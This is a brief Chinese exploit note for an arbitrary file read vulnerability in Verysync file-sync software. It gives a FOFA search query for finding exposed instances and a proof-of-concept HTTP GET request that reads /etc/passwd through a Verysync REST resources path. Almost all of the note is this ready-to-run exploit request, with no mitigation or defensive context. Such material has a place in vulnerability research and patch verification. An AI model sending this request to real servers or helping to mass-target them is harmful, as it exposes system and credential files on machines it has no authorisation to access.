# 微力同步-Verysync任意文件读取漏洞

# 漏洞复现

FOFA：body="Verysync"

POC/EXP：

```
GET /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false HTTP/1.1
Host: 127.0.0.1:8886
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

![image-20260101183821622](assets/image-20260101183821622.png)
